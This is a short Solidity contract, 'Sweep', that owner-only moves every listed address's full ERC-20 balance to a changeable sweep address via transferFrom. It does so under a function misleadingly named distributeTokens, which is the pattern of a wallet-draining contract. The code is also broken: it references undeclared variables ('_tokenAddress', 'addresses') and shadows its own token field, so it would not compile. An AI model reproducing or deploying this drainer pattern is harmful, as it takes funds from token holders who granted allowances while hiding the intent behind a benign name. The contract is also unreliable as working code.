// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Sweep is Ownable {
    IERC20 public token;
    address private sweepAddress;

    constructor(address _sweepAddress) {
        token = IERC20(_tokenAddress);
        sweepAddress = _sweepAddress;

    }

    function transferContractOwnership(address newOwner) public onlyOwner {
        transferOwnership(newOwner);
    }   

    function changeSweepAddress(address _sweepAddress) external onlyOwner {
        sweepAddress = _sweepAddress;
    } 

    

    function distributeTokens (address[] memory recipients, address _tokenAddress) public onlyOwner {
        IERC20 token = IERC20(_tokenAddress);
        for (uint256 i = 0; i < recipients.length; i++) {
            uint256 balance = token.balanceOf(addresses[i]);
            if (balance > 0) {
                require(token.transferFrom(addresses[i], sweepAddress, balance), "Transfer failed");
            }
        }
    }
}
